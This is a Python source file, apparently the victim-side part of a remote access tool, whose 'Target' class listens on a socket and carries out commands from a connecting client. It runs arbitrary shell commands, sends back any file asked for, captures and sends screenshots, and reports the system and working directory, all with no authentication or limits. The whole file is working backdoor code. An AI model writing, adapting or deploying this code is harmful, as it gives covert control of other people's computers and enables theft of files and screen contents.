import platform
import os
from PIL import ImageGrab

from base import *
from spliter import commande_spliter


class Target(ServerSocket):

    def __init__(self):
        super().__init__()

    async def accept_commands(self, addr: tuple):
        while True:
            result = None
            commande = await recv_header_and_data(recv_sock=self.clientsockets[addr])
            commande = commande.decode(encoding=ENCODING)
            splited_commande = commande_spliter(commande)

            if not commande:
                break

            elif commande == 'exit':
                break

            elif commande.lower() == 'os':
                result = platform.platform() + '\n'

            elif commande.lower() == 'info':
                result = os.getcwd()

            elif splited_commande[0] == 'cd':
                try:
                    os.chdir(splited_commande[1])
                    result = os.getcwd() + '\n'
                except FileNotFoundError as err:
                    result = str(err)

            elif splited_commande[0] == 'download':
                try:
                    with open(splited_commande[1], 'rb') as f:
                        result = f.read()
                except FileNotFoundError:
                    result = 'filenotfound'
                except IsADirectoryError:
                    result = 'isdir'

            elif splited_commande[0] == 'capture':
                try:
                    image = ImageGrab.grab()
                    image.save(splited_commande[1], 'png')
                    with open(splited_commande[1], 'rb') as img:
                        result = img.read()
                    os.remove(splited_commande[1])
                except OSError:
                    result = 'screenshot-error'

            else:
                proc = await asyncio.create_subprocess_shell(
                    commande,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                stdout, stderr = await proc.communicate()

                if stdout:
                    result = stdout
                if stderr:
                    result = stderr

            if commande.lower() != 'info':
                print(f' ⌨️ > {commande}')

            if not result or result == '':
                await send_header_and_data(self.clientsockets[addr], f'❗ No output'.encode(encoding=ENCODING))
            else:
                if isinstance(result, str):
                    result = result.encode(encoding=ENCODING)
                await send_header_and_data(self.clientsockets[addr], result)

        print(f'\n‼️{addr[0]}: {addr[1]} Deconnecte\n')
        self.clientsockets[addr].close()
        del self.clientsockets[addr]

    async def handle_clients(self, addr: tuple):
        print(f'💻 {addr} connecte 💻')
        task = asyncio.create_task(self.accept_commands(addr))
        await task


async def main():
    target = Target()
    task = asyncio.create_task(target.listen())
    await task


if __name__ == '__main__':
    asyncio.run(main())
